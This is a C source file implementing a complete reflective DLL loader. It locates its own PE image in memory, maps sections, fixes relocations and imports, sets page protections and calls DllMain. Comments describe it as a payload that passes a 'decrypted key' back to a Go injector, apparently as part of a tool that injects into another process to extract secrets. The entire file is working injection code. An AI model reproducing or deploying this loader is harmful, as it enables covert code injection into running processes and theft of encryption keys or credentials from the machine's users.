// SPDX-License-Identifier: Apache-2.0

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stddef.h>

#include "bootstrap.h"

typedef HMODULE (WINAPI *pfn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pfn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *pfn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pfn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LONG    (NTAPI  *pfn_NtFlushInstructionCache)(HANDLE, PVOID, ULONG);
typedef BOOL    (WINAPI *pfn_DllMain)(HINSTANCE, DWORD, LPVOID);

#define MARK(imgBase, step) do { \
    *(volatile BYTE *)((BYTE *)(imgBase) + BOOTSTRAP_MARKER_OFFSET) = (BYTE)(step); \
} while (0)

// noinline is load-bearing: if this gets inlined into Bootstrap,
// __builtin_return_address(0) returns the thread stub (ntdll) instead
// of an address inside our payload — the backward MZ scan would then
// walk the wrong module and crash.
static __attribute__((noinline)) ULONG_PTR get_caller_ip(void)
{
    return (ULONG_PTR)__builtin_return_address(0);
}

__declspec(dllexport) ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter)
{
    ULONG_PTR imageBase = get_caller_ip();
    while (imageBase > 0) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            LONG lfanew = dos->e_lfanew;
            if (lfanew > 0 && lfanew < 0x1000) {
                PIMAGE_NT_HEADERS64 nt =
                    (PIMAGE_NT_HEADERS64)(imageBase + (ULONG_PTR)lfanew);
                if (nt->Signature == IMAGE_NT_SIGNATURE) break;
            }
        }
        imageBase--;
    }
    if (imageBase == 0) return 0;
    MARK(imageBase, BOOTSTRAP_MARK_MZ_FOUND);

    pfn_LoadLibraryA   pLoadLibraryA   =
        *(pfn_LoadLibraryA *)(imageBase + BOOTSTRAP_IMPORT_LOADLIBRARYA_OFFSET);
    pfn_GetProcAddress pGetProcAddress =
        *(pfn_GetProcAddress *)(imageBase + BOOTSTRAP_IMPORT_GETPROCADDRESS_OFFSET);
    pfn_VirtualAlloc   pVirtualAlloc   =
        *(pfn_VirtualAlloc *)(imageBase + BOOTSTRAP_IMPORT_VIRTUALALLOC_OFFSET);
    pfn_VirtualProtect pVirtualProtect =
        *(pfn_VirtualProtect *)(imageBase + BOOTSTRAP_IMPORT_VIRTUALPROTECT_OFFSET);
    pfn_NtFlushInstructionCache pNtFlushIC =
        *(pfn_NtFlushInstructionCache *)(imageBase + BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET);

    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc ||
        !pVirtualProtect || !pNtFlushIC) {
        MARK(imageBase, BOOTSTRAP_MARK_ERR_IMPORTS);
        return 0;
    }
    MARK(imageBase, BOOTSTRAP_MARK_IMPORTS_OK);

    PIMAGE_DOS_HEADER oldDos = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS64 oldNt  =
        (PIMAGE_NT_HEADERS64)(imageBase + (ULONG_PTR)oldDos->e_lfanew);
    SIZE_T sizeOfImage = oldNt->OptionalHeader.SizeOfImage;

    BYTE *newBase = (BYTE *)pVirtualAlloc(
        NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!newBase) {
        MARK(imageBase, BOOTSTRAP_MARK_ERR_ALLOC);
        return 0;
    }
    MARK(imageBase, BOOTSTRAP_MARK_ALLOC_OK);

    BYTE *headerSrc = (BYTE *)imageBase;
    DWORD headerSize = oldNt->OptionalHeader.SizeOfHeaders;
    for (DWORD i = 0; i < headerSize; i++) {
        newBase[i] = headerSrc[i];
    }
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(oldNt);
    for (WORD i = 0; i < oldNt->FileHeader.NumberOfSections; i++) {
        BYTE *sSrc = (BYTE *)imageBase + sec[i].PointerToRawData;
        BYTE *sDst = newBase + sec[i].VirtualAddress;
        DWORD raw = sec[i].SizeOfRawData;
        for (DWORD j = 0; j < raw; j++) {
            sDst[j] = sSrc[j];
        }
    }
    MARK(imageBase, BOOTSTRAP_MARK_COPIED);

    PIMAGE_NT_HEADERS64 newNt =
        (PIMAGE_NT_HEADERS64)(newBase + (ULONG_PTR)oldDos->e_lfanew);

    LONG_PTR delta = (LONG_PTR)newBase - (LONG_PTR)newNt->OptionalHeader.ImageBase;
    DWORD relocSize = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    DWORD relocRva = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (delta != 0 && relocSize > 0 && relocRva > 0) {
        PIMAGE_BASE_RELOCATION reloc =
            (PIMAGE_BASE_RELOCATION)(newBase + relocRva);
        DWORD consumed = 0;
        while (reloc->VirtualAddress && consumed < relocSize) {
            DWORD count =
                (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *entries =
                (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD j = 0; j < count; j++) {
                WORD type = entries[j] >> 12;
                WORD offset = entries[j] & 0x0FFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR *target = (ULONG_PTR *)(newBase +
                        reloc->VirtualAddress + offset);
                    *target += (ULONG_PTR)delta;
                }
            }
            consumed += reloc->SizeOfBlock;
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE *)reloc + reloc->SizeOfBlock);
        }
    }
    MARK(imageBase, BOOTSTRAP_MARK_RELOCATED);

    DWORD impSize = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    DWORD impRva = newNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (impSize > 0 && impRva > 0) {
        PIMAGE_IMPORT_DESCRIPTOR imp =
            (PIMAGE_IMPORT_DESCRIPTOR)(newBase + impRva);
        while (imp->Name) {
            const char *modName = (const char *)(newBase + imp->Name);
            HMODULE hMod = pLoadLibraryA(modName);
            if (hMod) {
                DWORD origRva = imp->OriginalFirstThunk
                    ? imp->OriginalFirstThunk : imp->FirstThunk;
                PIMAGE_THUNK_DATA origThunk =
                    (PIMAGE_THUNK_DATA)(newBase + origRva);
                PIMAGE_THUNK_DATA thunk =
                    (PIMAGE_THUNK_DATA)(newBase + imp->FirstThunk);
                while (origThunk->u1.AddressOfData) {
                    FARPROC fn;
                    if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                        fn = pGetProcAddress(hMod,
                            (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                    } else {
                        PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)
                            (newBase + origThunk->u1.AddressOfData);
                        fn = pGetProcAddress(hMod, ibn->Name);
                    }
                    thunk->u1.Function = (ULONG_PTR)fn;
                    origThunk++;
                    thunk++;
                }
            }
            imp++;
        }
    }
    MARK(imageBase, BOOTSTRAP_MARK_IMPORTS_FIXED);

    sec = IMAGE_FIRST_SECTION(newNt);
    for (WORD i = 0; i < newNt->FileHeader.NumberOfSections; i++) {
        DWORD newProtect = PAGE_READONLY;
        DWORD ch = sec[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE) {
            newProtect = (ch & IMAGE_SCN_MEM_WRITE)
                ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (ch & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_READWRITE;
        }
        DWORD oldProtect = 0;
        pVirtualProtect(newBase + sec[i].VirtualAddress,
                        sec[i].Misc.VirtualSize,
                        newProtect, &oldProtect);
    }
    MARK(imageBase, BOOTSTRAP_MARK_PERMISSIONS);

    pNtFlushIC((HANDLE)-1, NULL, 0);
    MARK(imageBase, BOOTSTRAP_MARK_CACHE_FLUSHED);

    // lpReserved carries the original raw-image base so DllMain can write
    // the decrypted key back into the scratch region the Go injector reads.
    pfn_DllMain pDllMain =
        (pfn_DllMain)(newBase + newNt->OptionalHeader.AddressOfEntryPoint);
    pDllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, (LPVOID)imageBase);

    MARK(imageBase, BOOTSTRAP_MARK_DONE);
    return (ULONG_PTR)newBase;
}
